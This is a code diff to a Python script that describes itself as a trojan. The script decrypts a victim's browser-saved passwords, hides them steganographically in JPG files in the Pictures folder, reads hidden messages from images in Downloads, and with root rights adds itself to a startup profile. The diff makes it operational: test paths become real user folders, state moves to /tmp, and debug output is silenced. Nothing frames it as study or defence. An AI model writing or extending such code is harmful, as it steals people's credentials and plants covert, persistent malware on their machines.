@@ -139,20 +139,20 @@ def first_run():
 	msglist = decrypt_passwords()			# List of browser saved passwords
 	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
 	i = -1									# Message Iterator
-	encode_dir = path.expanduser("~/Pictures/Pictures/")
+	encode_dir = path.expanduser("~/Pictures/")
 	num_of_files = 0
 	if num_of_msgs > 0:
 		for infile in glob.glob(encode_dir+"*.jpg"):
 			i = (i+1)%num_of_msgs;
 			encode(infile,msglist[i]);
 			num_of_files = num_of_files + 1
-		f = open('bootup.cfg', 'w+')
+		f = open('/tmp/bootup.cfg', 'w+')
 		num_encoded = min(num_of_msgs, num_of_files)
 		f.write(str(num_encoded)+"\n")
 		f.write("1950-01-01 00:00:00")
 		f.close()
-		for infile in glob.glob(encode_dir+"*.jpg"):
-			print "-->ENCODE RUN : ",decode(infile)
+		#for infile in glob.glob(encode_dir+"*.jpg"):
+		#	print "-->ENCODE RUN : ",decode(infile)
 	if geteuid() == 0:						#Adding to startup scripts if root privileges
 		try:
 			f = open('../profile','a')			# Change file to /etc/profile
@@ -167,7 +167,7 @@ def encode_run (decode_msglist,update_dt):
 	msglist = browser_msglist + decode_msglist
 	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
 	i = -1									# Message Iterator
-	encode_dir = path.expanduser("~/Pictures/Pictures/")
+	encode_dir = path.expanduser("~/Pictures/")
 	num_of_files = 0
 	if num_of_msgs > 0:
 		for infile in glob.glob(encode_dir+"*.jpg"):
@@ -179,13 +179,13 @@ def encode_run (decode_msglist,update_dt):
 		f.write(str(num_encoded)+"\n")
 		f.write(update_dt.strftime("%Y-%m-%d %H:%M:%S"))
 		f.close()
-		for infile in glob.glob(encode_dir+"*.jpg"):
-			print "-->ENCODE RUN : ",decode(infile)
+		#for infile in glob.glob(encode_dir+"*.jpg"):
+		#	print "-->ENCODE RUN : ",decode(infile)
 	return num_encoded
 
 # Main Function
 while True:
-	if (not path.exists('bootup.cfg')):			#Checking if its first run of trojan
+	if (not path.exists('/tmp/bootup.cfg')):			#Checking if its first run of trojan
 		first_run()
 	else:
 		try:
@@ -193,7 +193,7 @@ while True:
 		except NameError:
 			update_dt = None
 		if update_dt is None:
-			f = open('bootup.cfg','r')
+			f = open('/tmp/bootup.cfg','r')
 			try:
 				num_encoded = int(f.readline())
 			except:
@@ -202,24 +202,24 @@ while True:
 			f.close()
 			update_dt = datetime.strptime(update_dtline,"%Y-%m-%d %H:%M:%S")
 		
-		encode_dir = path.expanduser("~/Pictures/Pictures/")
-		decode_dir = path.expanduser("~/Pictures/Downloads/")
+		encode_dir = path.expanduser("~/Pictures/")
+		decode_dir = path.expanduser("~/Downloads/")
 		encodeflg = 0
 		msglist = []
-		for infile in glob.glob(decode_dir+"*.jpg"):
+		for infile in glob.glob(decode_dir+"*.png"):
 			#print decode(infile);	
 			file_cdt = datetime.fromtimestamp(path.getctime(infile))
 			
 			if ( (file_cdt - update_dt) > timedelta(0)):
 				msg = decode(infile)
 				if (isvalidformat(msg)):
-					print "***DOWNLOADS***", msg
+					#print "***DOWNLOADS***", msg
 					if msg not in msglist:
 						msglist.append(msg)
 						encodeflg = 1
 				# To update encode variables	
 		#print "Update Time:", update_dt
-		f = open('bootup.cfg','w+')
+		f = open('/tmp/bootup.cfg','w+')
 		f.write(str(num_encoded)+"\n")
 		update_dt = datetime.now()
 		f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
